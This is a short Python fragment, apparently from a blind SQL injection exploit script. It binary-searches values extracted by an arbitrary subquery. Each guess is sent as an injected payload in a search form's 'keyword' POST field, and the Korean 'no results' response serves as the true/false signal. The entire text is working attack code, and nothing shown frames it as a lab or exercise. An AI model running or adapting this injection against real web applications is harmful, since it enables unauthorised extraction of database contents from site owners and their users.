def binarySearch(query):
    start = 1
    end  = 127
    while start < end:
        mid = int((start + end) / 2)        
        
        keyword = f"EQST%' and ({query}) > {mid} and '1%'='1"
        d["keyword"] = keyword        
        r = requests.post(url=u, headers=h, cookies=c, data=d)
        if '결과가 없습니다.' in r.text:            
            end = mid           
        else:             
            start = mid + 1
    return end